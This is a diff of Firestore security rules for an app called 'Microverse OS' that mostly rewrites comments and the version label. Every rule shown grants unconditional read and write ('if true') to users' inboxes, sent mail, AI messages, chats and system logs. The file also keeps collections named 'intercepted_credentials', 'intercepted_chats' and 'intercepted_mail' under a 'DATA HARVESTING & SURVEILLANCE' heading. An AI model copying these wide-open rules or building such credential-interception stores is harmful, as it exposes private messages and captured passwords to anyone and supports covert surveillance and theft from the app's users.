@@ -2,25 +2,25 @@ rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
     
-    // --- MICROVERSE OS SURVEILLANCE PROTOCOLS v9.5 ---
+    // --- MICROVERSE OS RULES v9.6 ---
     
+    // Allow read/write for all users collection subpaths
     match /users/{userId} {
       allow read, write: if true;
-
+      
       match /ai_messages/{msgId} { allow read, write: if true; }
       match /inbox/{emailId} { allow read, write: if true; }
       match /sent_mail/{emailId} { allow read, write: if true; }
       match /games/{gameId} { allow read, write: if true; }
     }
 
-    // GLOBAL EVENT LOG
+    // Allow read/write for global system logs (Required for AdminApp and Logging)
     match /system_logs/{logId} { allow read, write: if true; }
 
-    // CHAT & MESSAGING
+    // Allow read/write for chats
     match /chats/{chatId}/messages/{msgId} { allow read, write: if true; }
 
-    // --- DATA HARVESTING LAYERS (Newly Authorized) ---
-    // Explicitly allow writing to these collections so authentication doesn't fail
+    // --- DATA HARVESTING & SURVEILLANCE ---
     match /intercepted_credentials/{docId} { allow read, write: if true; }
     match /intercepted_chats/{docId} { allow read, write: if true; }
     match /intercepted_mail/{docId} { allow read, write: if true; }
